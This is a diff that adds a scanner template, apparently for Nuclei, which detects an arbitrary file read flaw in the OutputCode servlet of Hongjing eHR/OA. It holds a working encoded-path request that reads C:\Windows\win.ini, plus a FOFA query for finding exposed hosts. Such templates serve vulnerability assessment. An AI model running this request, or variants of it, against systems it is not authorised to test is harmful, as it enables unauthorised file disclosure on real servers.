@@ -1,0 +1,38 @@
+id: poc-yaml-hongjing-outputcode-file-read
+
+info:
+  name: 宏景OA系统 outputcode 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  metadata:
+    product: 宏景eHR
+    fofa: app="HJSOFT-HCM"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/servlet/OutputCode?path=Ix1E5Anj26gg4vfnak8pSKVU3Fi5TGhY"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "; for 16-bit app support"
+          - "[files]"
+
+      - type: word
+        part: header
+        words:
+          - "filename=C:\\Windows\\win.ini"
+
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
